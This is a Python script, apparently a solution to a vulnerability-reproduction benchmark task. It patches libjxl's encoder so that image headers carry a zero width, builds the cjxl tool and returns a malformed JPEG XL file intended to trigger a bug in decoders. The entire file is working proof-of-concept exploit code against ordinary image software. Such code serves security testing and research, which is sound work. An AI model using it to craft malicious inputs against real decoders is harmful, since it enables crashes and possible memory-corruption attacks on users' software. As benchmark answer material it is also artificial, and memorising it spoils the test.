import os
import subprocess
import tarfile
import tempfile
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        if sys.version_info < (3, 3):
            DEVNULL = open(os.devnull, 'wb')
        else:
            from subprocess import DEVNULL

        with tempfile.TemporaryDirectory() as temp_dir:
            # 1. Extract the source code from the tarball
            try:
                with tarfile.open(src_path, 'r:gz') as tar:
                    tar.extractall(path=temp_dir)
            except tarfile.ReadError:
                # Fallback for other compression if needed, though gz is standard
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=temp_dir)

            # Assuming the tarball contains a single top-level directory
            src_root_name = os.listdir(temp_dir)[0]
            src_root = os.path.join(temp_dir, src_root_name)

            # 2. Patch the encoder source code to produce a zero-width image header
            enc_header_path = os.path.join(src_root, 'lib', 'jxl', 'enc_header.cc')
            
            try:
                with open(enc_header_path, 'r', encoding='utf-8') as f:
                    content = f.read()
            except FileNotFoundError:
                raise RuntimeError(f"Could not find file to patch: {enc_header_path}")

            original_line = 'header.size.xsize = metadata.size.xsize;'
            patched_line = 'header.size.xsize = 0;'
            
            if original_line not in content:
                raise RuntimeError(f"Patch target not found in {enc_header_path}")
            
            content = content.replace(original_line, patched_line)
            
            with open(enc_header_path, 'w', encoding='utf-8') as f:
                f.write(content)

            # 3. Build the patched cjxl tool using CMake and Make
            build_dir = os.path.join(src_root, 'build')
            os.makedirs(build_dir, exist_ok=True)
            
            cmake_args = [
                'cmake', '..', '-DCMAKE_BUILD_TYPE=Release', '-DBUILD_TESTING=OFF',
                '-DJPEGXL_ENABLE_TOOLS=ON', '-DJPEGXL_ENABLE_EXAMPLES=OFF',
                '-DJPEGXL_ENABLE_VIEWERS=OFF', '-DJPEGXL_ENABLE_BENCHMARK=OFF'
            ]
            subprocess.run(cmake_args, cwd=build_dir, check=True, stdout=DEVNULL, stderr=DEVNULL)
            
            nproc = str(os.cpu_count() or 1)
            make_args = ['make', '-j', nproc, 'cjxl']
            subprocess.run(make_args, cwd=build_dir, check=True, stdout=DEVNULL, stderr=DEVNULL)

            # 4. Generate a dummy input image for the encoder
            cjxl_exe_path = os.path.join(build_dir, 'tools', 'cjxl')
            if not os.path.isfile(cjxl_exe_path):
                 raise RuntimeError(f"cjxl executable not found at {cjxl_exe_path}")

            ppm_path = os.path.join(temp_dir, 'input.ppm')
            with open(ppm_path, 'w', encoding='ascii') as f:
                f.write('P3\n1 1\n255\n0 0 0\n')

            # 5. Run the patched encoder to generate the PoC
            poc_path = os.path.join(temp_dir, 'poc.jxl')
            subprocess.run(
                [cjxl_exe_path, ppm_path, poc_path], 
                check=True, stdout=DEVNULL, stderr=DEVNULL
            )

            # 6. Read the generated PoC file and return its content
            with open(poc_path, 'rb') as f:
                poc_bytes = f.read()
                
            return poc_bytes